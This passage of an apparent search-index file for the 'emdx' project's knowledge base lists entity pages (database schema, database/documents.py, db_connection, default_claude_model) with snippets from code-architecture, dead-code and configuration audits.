[3/3]\n  &gt; Recipe System (`emdx recipe`)\nReusable instruction templates saved as tagged documents for consistent AI execution patterns. ## Database Schema (Key Tables)\n\n| Table | Purpose |\n|-------|---------|\n| documents | Document metadata, content, stage trac...\n\n- **#6180** Delegate: Task System Comprehensive Analysis [15/15]\n  &gt; Task CLI (`emdx/commands/tasks.py`)**\n- `create`: Create task with priority, gameplan, dependencies\n- `list/show`: View tasks with filtering by status/gameplan/project\n- `update`: Change status, priority, add notes\n- `log`: Append progress entries\n- ...\n\n- **#6168** Delegate: Analyze the emdx task system's data model and database schem [1/15]\n  &gt; **Bidirectional Queries**:\n   - `get_dependencies(task_id)` \u2192 tasks this task depends on\n   - `get_dependents(task_id)` \u2192 tasks that depend on this task\n\n### Ready Task Query Logic\n\n```sql\nSELECT t.* FROM tasks t\nWHERE t.status = \"open\"\nAND NOT EXIST...\n\n- **#284** CLAUDE-SYSTEM-ADVANCED-DESIGN\n  *Section: Implementation Approach*\n  &gt; ### Database Schema with Hierarchy Support\n```sql\nCREATE SCHEMA claude;\n\n- **#104** Versioning System Overview and CLA Integration Ideas\n  *Section: Integration with CLA App*\n  &gt; ...(2 versions) \u2502\n\u2502 #124   Meeting Notes                 [v1] (no history)\u2502\n\u2502 #125 \u25cf Database Schema              [v5] (4 versions) \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ul> <li>#20 Document Linking and References Plan   Section: Implementation Details </li> </ul>"},{"location":"entities/database-schema/#2-database-schema","title":"2. Database Schema","text":"<p>```sql -- Track document relationships CREATE TABLE claude.knowledge_links (     id SERIAL PRIMARY KEY,     source_id INTEGER REFERENCES claude.knowledge(id),     ta...</p>"},{"location":"entities/database-schema/#related-entities","title":"Related Entities","text":"<ul> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>smart features</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>monitoring</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>workflow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>cycle detection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>claude code integration</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/database/","title":"database/","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/database/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: All 45 TypedDicts (by location)</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 1: <code>models/</code> Directory Naming (PARTIALLY ADDRESSED)</p> <p>Current State: The <code>models/</code> directory now re-exports from <code>database/</code>:</p> </li> <li><code>models/documents.py</code> - Re-exports from <code>emdx.database.documents</code> with deprecation note</li> <li> <p><code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/tags.py</code> - Need inspection</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Overview</p> <p>This synthesis consolidates findings from 6 detailed architecture analyses covering the entire EMDX codebase (~37K lines, 132 files). The analyses examined commands, services, UI, database/models, utils/config, and overall architecture patterns.</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 database/         Core database operations                   \u2502 \u2502 \u251c\u2500\u2500 migrations.py (2200 lines) Schema evolution             \u2502 \u2502 \u251c\u2500\u2500 documents.py  (691 lines) Document CRUD...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 1. Architectural Strengths</p> <p>...ll</p> </li> <li>Layered Architecture: Clean separation between <code>commands/</code>, <code>services/</code>, <code>database/</code>, <code>models/</code>, and <code>ui/</code></li> <li>Lazy Loading: Heavy commands (cascade, delegate, AI) use lazy imports for fast CLI startup</li> <li> <p>Strategy Pattern: CLI executor factory...</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...they're repositories, not domain models. Rename to <code>repositories/</code> or merge into <code>database/</code> | | <code>commands/analyze.py</code> has 700+ lines of business logic | HIGH | Health calculations, duplicate detection, tag analysis mixed with CLI presentation. Extract to `...</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: \u2705 Strengths</p> <p>...efactoring</p> </li> <li>Good Architecture \u2014 Clear separation: commands/, services/, ui/, database/</li> <li>Documentation \u2014 10 markdown docs covering architecture, CLI, setup</li> <li> <p>Modern Tooling \u2014 Poetry, pytest, black, ruff, mypy configured</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li><code>connection.py</code>: SQLite context manager with foreign keys enabled</li> <li> <p><code>documents.py</code>: CRUD with access tracking (<code>track_access</code> flag prevents count inflati...</p> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: Module-by-Module Analysis</p> <p>...catches need logging | | <code>models/</code> | 8/10 | Proper sqlite3 exception handling | | <code>database/</code> | 8/10 | Good integrity error handling |</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: Layer Architecture Overview</p> <p>...s logic | | <code>models/</code> | Domain models | Database access layer (VIOLATION) | | <code>database/</code> | Database operations | Pure database operations | | <code>services/</code> | Business logic | Business logic + database access |</p> </li> </ul>"},{"location":"entities/database/#databasetypespy-12-typeddicts","title":"<code>database/types.py</code> \u2014 12 TypedDicts","text":"TypedDict total=False? <code>DocumentGroup</code> no <code>GroupMember</code> no <code>DocumentWithGroups</code> no `DocumentRo..."},{"location":"entities/database/#3-database-layer-database","title":"3. Database Layer (<code>database/</code>)","text":""},{"location":"entities/database/#related-entities","title":"Related Entities","text":"<ul> <li><code>total python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>what's good</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>ui/keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>type safety coverage audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>toolcallmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>tool_uses</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>thinkingmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>tasks_completed: list[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>systemmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/databasedocumentspy/","title":"database/documents.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-01-13</p>"},{"location":"entities/databasedocumentspy/#documents-12","title":"Documents (12)","text":"<ul> <li>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Architecture Notes <p>...orktree<code>from</code>utils/git.py`</p> </li> <li>Document ops: <code>get_document</code>, <code>save_document</code> from <code>database/documents.py</code></li> <li> <p>Task model: <code>create_task</code>, <code>update_task</code> from <code>models/tasks.py</code>...</p> </li> <li> <p>#6544 Delegate Enhancement Gameplans [4/5]   Section: Implementation Steps (Ordered)</p> <ol> <li>Add document query to <code>database/documents.py</code></li> </ol> </li> <li> <p><code>get_docs_in_window(hours)</code></p> </li> <li> <p>#6445 Test [2/2]   Section: Coverage Analysis by Area</p> <p>...3% | Output utilities | | <code>utils/chunk_splitter.py</code> | 78% | Document chunking | | <code>database/documents.py</code> | 74% | Document CRUD | | <code>ui/presenters/document_browser_presenter.py</code> | 74% | Document browser presenter |</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Dependency Flow Analysis</p> </li> <li><code>database/documents.py</code> imports from <code>models/tags</code> (layer violation)</li> <li><code>utils/claude_wrapper.py</code> imports from <code>models/executions</code> (layer violation)</li> <li> <p><code>commands/</code> sometimes bypasses <code>services/</code></p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 2. Inconsistent Data Access Patterns</p> <p>Pattern A - Raw dicts from sqlite3.Row:</p> </li> <li><code>database/documents.py</code>: Returns <code>dict[str, Any]</code></li> <li><code>database/groups.py</code>: Returns <code>dict[str, Any]</code></li> <li><code>database/cascade.py</code>: Returns <code>dict[str, Any]</code></li> <li> <p><code>models/tasks.py</code>: Returns <code>dict[str, Any]</code></p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.4 Model vs Database Layer Clarity (Medium Priority)</p> <p>Current State: </p> </li> <li><code>database/documents.py</code> - 692 lines of actual operations</li> <li> <p><code>models/documents.py</code> - 35 lines just re-exporting</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...ags.py<code>,</code>trash.py<code>import</code>database/<code>directly | | 2 layer violations | MEDIUM |</code>database/documents.py<code>imports from</code>models/tags<code>(upward);</code>utils/claude_wrapper.py<code>imports from</code>models/executions` |</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: Thin Wrapper Files (by design, but worth auditing)</p> <p>...rpose | |------|-------|---------| | <code>models/documents.py</code> | 36 | Re-exports from <code>database/documents.py</code> | | <code>services/tag_service.py</code> | 20 | Re-exports from <code>models/tags.py</code> | | <code>services/group_service.py</code> | 36 | Re-exports from <code>database/groups.py</code> |</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 6. LOW: Database Layer is Well-Isolated**</p> <p>Positive Finding: <code>database/documents.py</code>, <code>database/cascade.py</code>, <code>database/search.py</code></p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 3. MISSING EDGE CASE TESTS</p> <p>...Operations | Module | Edge Case | Severity | |--------|-----------|----------| | <code>database/documents.py</code> | SQL injection in search queries | \ud83d\udd34 CRITICAL | | <code>database/documents.py</code> | Unicode/emoji in titles and content | \ud83d\udfe1 HIGH | | <code>database/documents.py</code> | Very large d...</p> </li> <li> <p>#6183 Delegate: analysis,audit [13/17]   Section: \ud83d\udfe2 Minor</p> <ol> <li>Largest Files (complexity hotspots)    | File | Lines |    |------|-------|    | <code>database/migrations.py</code> | 1,992 |    | <code>commands/maintain.py</code> | 1,101 |    | <code>database/documents.py</code> | 1,063 |</li> </ol> </li> <li> <p>#4746 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 1: N+1 Database Query Pattern (Universal - CRITICAL)</p> <p>Root Cause: Missing batch query functions in <code>emdx/workflows/database.py</code> and <code>emdx/database/documents.py</code>.</p> </li> </ul>"},{"location":"entities/databasedocumentspy/#problematic-dependencies","title":"Problematic Dependencies \u26a0","text":""},{"location":"entities/databasedocumentspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>database/search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>database/cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>utils/logging_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>utils/environment.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>test_output_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>test_groups.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>services/file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>database/groups.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>utils/output_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>ui/search/search_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/dbconnection/","title":"db_connection","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-01-13</p>"},{"location":"entities/dbconnection/#documents-10","title":"Documents (10)","text":"<ul> <li>#6445 Test [2/2]   Section: Key Testing Patterns <p>...n DB</p> </li> <li>Uses <code>EMDX_TEST_DB</code> environment variable</li> <li> <p>Patches all modules that import <code>db_connection</code></p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p><code>executions.py</code> imports <code>db_connection</code> from <code>..database.connection</code> while other model files import <code>db</code> from <code>emdx.database</code>. This inconsistency could cause issues if the two modules behave differently or one is deprecated.</p> </li> <li> <p>#6355 Delegate: Document #6349 (Service Layer &amp; Cascade Refactor Plan): Implementation Complete   Section: Changes Made</p> </li> <li>Replaced direct SQL query with call to <code>get_orphaned_cascade_executions()</code></li> <li>Removed <code>db_connection</code> import from UI layer</li> <li> <p>Now imports from cascade_service instead</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Strengths</p> </li> <li>Clean connection management with <code>db_connection</code> singleton</li> <li>Backward-compatible <code>SQLiteDatabase</code> wrapper for test isolation</li> <li> <p>Migrations at 2200 lines shows mature schema evolution</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 2. Inconsistent Data Access Patterns</p> <p>Executions uses:</p> </li> </ul> <pre><code>from ..database.connection import db_connection\nwith db_connection.get_connection() as conn:  # line 76, 89, 120...\n</code></pre> <ul> <li>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.2 Database Connection Pattern (Medium Priority) <p>Current State: Global singleton <code>db_connection</code> in <code>database/connection.py:69</code>:</p> </li> </ul> <pre><code>db_connection = DatabaseConnection()\n</code></pre> <ul> <li>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: Key Design Patterns <ol> <li>Global Database Singleton \u2014 <code>db_connection</code> in <code>database/connection.py:69</code></li> </ol> </li> <li>Facade Pattern \u2014 Services re-export database functions (e.g., <code>cascade_service.py</code>, <code>tag_service.py</code>)</li> <li> <p>DTO Pattern \u2014 Dat...</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: Alias vs Direct Import</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> </li> <li><code>emdx/database/__init__.py:15</code> - unused import: <code>db_connection</code></li> <li><code>emdx/database/__init__.py:29</code> - unused import: <code>groups</code></li> <li><code>emdx/database/__init__.py:30</code> - unused import: <code>cascade</code></li> <li> <p><code>emdx/database/cascade.py:14</code> - unused impo...</p> </li> <li> <p>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: 1. SQLiteDatabase Wrapper Architecture Bug (Identified by all 4 tracks)</p> <p>Root Cause: The <code>SQLiteDatabase</code> wrapper class creates its own <code>DatabaseConnection</code> instance but delegates all operations to module-level functions that use the global <code>db_connection</code> singleton.</p> </li> </ul>"},{"location":"entities/dbconnection/#2-updated-activity_datapy","title":"2. Updated activity_data.py","text":""},{"location":"entities/dbconnection/#2-robust-database-layer","title":"2. Robust Database Layer","text":""},{"location":"entities/dbconnection/#pattern-b-use-db_connection-explicit","title":"Pattern B: Use 'db_connection' (explicit)","text":"<p>from .connection import db_connection db_connection.get_connection()  # database/search.py:9, services/cascade_service.py:15 ```</p>"},{"location":"entities/dbconnection/#database-module-re-exports","title":"Database Module Re-exports","text":""},{"location":"entities/dbconnection/#related-entities","title":"Related Entities","text":"<ul> <li><code>split large files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>documentpreviewmodal</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>delete_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>test_lazy_loading.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>test infrastructure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>layered architecture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>get_db_path()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>execution_timeout_seconds</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>duplicate code</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>get_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/defaultclaudemodel/","title":"default_claude_model","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/defaultclaudemodel/#documents-10","title":"Documents (10)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/defaultclaudemodel/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: 1. <code>emdx/config/constants.py</code> \u2014 38 dead constants</p> <p>...63 | Never used anywhere | | <code>DEFAULT_STAGE_RUNS</code> | 187 | Never used anywhere | | <code>DEFAULT_CLAUDE_MODEL</code> | 193 | Re-exported but never imported (cli_config.py has its own) | | <code>DEFAULT_CLAUDE_SONNET_MODEL</code> | 194 | Never used anywhere | | <code>SUBPROCESS_DEFAULT_TIMEOUT</code> |...</p> <ul> <li>#6469 Centralized Configuration Constants for EMDX   Section: Model Configuration <p>...- <code>CLAUDE_MODEL_SONNET</code> / <code>CLAUDE_SONNET_MODEL</code> = \"claude-sonnet-4-5-20250929\"</p> </li> <li><code>DEFAULT_CLAUDE_MODEL</code> = CLAUDE_OPUS_MODEL (default for most operations)</li> <li><code>DEFAULT_ASK_MODEL</code> / <code>DEFAULT_CLAUDE_FAST_MODEL</code> = CLAUDE_SONNET_MODEL (for Q&amp;A service)</li> <li> <p><code>CURSOR_MODEL_OPUS</code>...</p> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Issue 1: Model Duplication in cli_config.py</p> <p><code>DEFAULT_CLAUDE_MODEL</code> is defined in both files:</p> </li> <li><code>constants.py:193</code> - <code>DEFAULT_CLAUDE_MODEL = \"claude-opus-4-5-20251101\"</code></li> <li> <p><code>cli_config.py:79</code> - <code>default_model=\"claude-opus-4-5-20251101\"</code></p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 6. CONSTANTS CONSOLIDATION (LOW PRIORITY)</p> <ul> <li><code>DEFAULT_CLAUDE_MODEL</code> defined in both <code>config/constants.py</code> AND <code>config/cli_config.py</code></li> </ul> </li> <li> <p>Various truncation lengths defined in <code>text_formatting.py</code> that could use constants</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> </li> <li><code>CLAUDE_OPUS_MODEL</code> = \"claude-opus-4-5-20251101\"</li> <li><code>CLAUDE_SONNET_MODEL</code> = \"claude-sonnet-4-5-20250929\"</li> <li><code>DEFAULT_CLAUDE_MODEL</code> (opus)</li> <li> <p><code>DEFAULT_CLAUDE_FAST_MODEL</code> (sonnet)</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> <p>...`</p> </li> <li>emdx/config/cli_config.py: removed <code>field</code></li> <li>emdx/config/settings.py: removed <code>DEFAULT_CLAUDE_MODEL</code></li> <li>emdx/database/cascade.py: removed <code>Optional</code></li> <li>emdx/database/search.py: removed <code>re</code></li> <li> <p>emdx/services/claude_executor.py: removed <code>CliTool</code>, <code>get_cli_config</code>, `DEF...</p> </li> <li> <p>#6256 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [19/37]   Section: Files Modified (17 total)</p> <p>Config:</p> </li> <li>cli_config.py: Removed unused <code>field</code> import</li> <li> <p>settings.py: Removed unused <code>DEFAULT_CLAUDE_MODEL</code> import</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...e-exported: <code>BRANCH_CLEANUP_DAYS</code>, <code>DEFAULT_BATCH_LIMIT</code>, <code>DEFAULT_BROWSE_LIMIT</code>, <code>DEFAULT_CLAUDE_MODEL</code>, <code>DEFAULT_LIST_LIMIT</code>, <code>DEFAULT_MAX_AGENT_ITERATIONS</code>, <code>DEFAULT_MAX_CONCURRENT_STAGES</code>, <code>DEFAULT_MAX_CONTEXT_DOCS</code>, <code>DEFAULT_MAX_SUGGESTIONS</code>, `DEFAULT_MAX_TAGS_PER...</p> </li> <li> <p>#6231 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14]   Section: CRITICAL SEVERITY</p> <p>...-4-5-20250929<code>| Multiple hardcoded model strings | |</code>config/constants.py:193<code>|</code>DEFAULT_CLAUDE_MODEL` | Centralized but not used everywhere |</p> </li> <li> <p>#6181 Delegate: Audit emdx/services/ for dead code. For EACH of the 22 files [2/17]   Section: FILE-BY-FILE ANALYSIS</p> <p>...t datetime` imported but NEVER USED</p> </li> <li>emdx/services/document_executor.py:25 - <code>DEFAULT_CLAUDE_MODEL</code> imported but NEVER USED</li> <li><code>execute_document_background</code> is only exported in init.py but never imported elsewhere</li> <li>**<code>ExecutionType</code> enum is only export...</li> </ul>"},{"location":"entities/defaultclaudemodel/#2-new-model-constants-added","title":"2. New Model Constants Added","text":""},{"location":"entities/defaultclaudemodel/#related-entities","title":"Related Entities","text":"<ul> <li><code>get_default_cli_tool</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>get_db_path</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>field</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>default_max_suggestions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>vertical</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>trash_cleanup_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>stale_document_archival_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> 